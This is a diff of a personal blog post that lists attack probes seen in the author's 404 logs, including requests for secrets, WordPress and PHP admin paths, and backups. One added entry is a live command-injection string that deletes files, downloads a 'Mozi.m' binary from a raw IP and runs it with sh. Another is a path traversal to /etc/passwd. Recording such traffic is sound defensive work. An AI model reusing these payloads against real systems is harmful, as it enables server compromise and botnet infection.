@@ -18,20 +18,79 @@ I added invalid path logging to my [custom site](/blog/site_launch_design) as an
 error-checking measure. Every once and a while, I check these logs for the heck
 of it. Surprise surprise, a significant portion of these are attacks:
 
-- `.git/config`
-- `.ssh/config`
-- `system/js/core.js`
-- `blog.tar`
-- `blog.tar.gz`
-- `blog.zip`
-- `phpMyAdmin`
-- `phpmyadmin`
-- `fw.php`
-- `database.php`
-- `wp-login.php`
+- General:
+  - `.git/config`
+  - `.ssh/config`
+  - `.env`
+  - `system/js/core.js`
+  - `config.js`
+  - `blog.tar`
+  - `blog.tar.gz`
+  - `blog.zip`
+  - `.well-known/acme-challenge`
+  - `..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`
+  - `/cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.170.53.6:51978/Mozi.m;${IFS}sh${IFS}/var/tmp/Mozi.m`
+- php:
+  - `phpMyAdmin`
+  - `phpmyadmin`
+  - `fw.php`
+  - `txets.php`
+  - `database.php`
+  - `rip.php`
+  - `admin.php`
+  - `class-t.api.php`
+  - `admin-funs.php`
+  - `ioxi-o.php`
+  - `goods.php`
+  - `class-t.api.php`
+- Wordpress:
+  - `wp-login.php`
+  - `wp-good.php`
+  - `wp-includes/`
+    - `js`
+      - `plupload`
+      - `thickbox`
+      - `tinymce`
+    - `style-engine`
+    - `Text`
+  - `wp-content/`
+    - `admin.php`
+    - `txets.php`
+    - `plugins/`
+      - `gravityforms`
+      - `contact-form-7`
+      - `wp-file-manager`
+      - `ultimate-member`
+      - `litespeed-cache`
+  - `wp-admin/`
+    - `network`
+- Backups:
+  - `bak/` | `back/` | `backups/` | `old/`
+    - `archive.zip`
+    - `config.js`
+    - `www.zip`
+    - `directory.tar.gz`
+    - `bak.rar`
+    - `full_backup.zip`
+    - `public_html.gz`
+    - `wallet.dat`
+    - `wallet.zip`
+    - `Archive.zip`
+    - `sql.sql`
+  - `restore/`
+    - `backup.tar.gz`
+    - `backup.sql.gz`
+- Misc.:
+  - `sftp-config.json`
+  - `mysql.sql`
 
 > Edit: I'll try to keep this updated over time, if I find anything new. These
 > are all from recent logs. Historically, there's been more variance.
+
+> Edit: For a while the logged 404 pages were limited to a subset of /blog. This
+> has been fixed, and I now see an even scarier list of pages trying to be
+> accessed. I think a fun next-step will be to do some lookups on the IPs trying
+> to access these pages.
 
 My site used to get much more bot traffic, as identified by the error rate on
 these logs. Since then, my [robots.txt](/robots.txt) has become significantly
